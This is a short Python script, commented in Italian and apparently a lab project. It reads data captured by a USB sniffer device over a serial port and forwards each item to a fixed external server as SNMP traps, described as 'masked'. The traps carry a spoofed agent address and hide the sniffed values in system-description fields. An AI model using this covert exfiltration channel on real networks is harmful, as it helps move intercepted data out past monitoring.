#LO SCRIPT E' USATO PER LEGGERE DA PORTA SERIALE, QUINDI VA ESEGUITO DOPO AVER COLLEGATO IL DISPOSITIVO SNIFFER AL PC TRAMITE PORTA USB

import serial
import time

TRAPSRV = "192.168.204.128" # impostazione dell'indirizzo del dipositivo esterno
LOCALIP = "192.168.1.12"

## PRENDE INPUT DA SERIALE
# apertura porta seriale
s = serial.Serial('com7', 115200)

print("serial:", s)
time.sleep(0.2)
print("inizio lettura")

# esecuzione continua
while True:
    #dati = s.readline().decode('ascii')
    #print("dati: ", dati)

    #ricezione dati dalla porta seriale
    str=s.readline().decode().strip('rcv from \n').split(" = ",1)
    print(str[0])
    print(str[1])

    ## INVIO NOTIFICA SNMP TRAP AL SERVER ##
    from pysnmp.hlapi import * #importa tutto dalla libreria pysnmp.hlapi

    ## invio dati al destinatario, con un tentativo di mascheramento ##
    iterator = sendNotification(
        SnmpEngine(),
        CommunityData('public', mpModel=0),
        UdpTransportTarget((TRAPSRV, 162)),
        ContextData(),
        'trap',
        NotificationType(
            ObjectIdentity('1.3.6.1.2.1.1')
        ).addVarBinds(
            ('1.3.6.1.6.3.18.1.3.0', '192.168.122.1'),
            ('1.3.6.1.2.1.1.1', str[1]),        #sysdescr
            ('1.3.6.1.2.1.1.5', str[0]),        #sysname
        )
    )

    errorIndication, errorStatus, errorIndex, varBinds = next(iterator) 
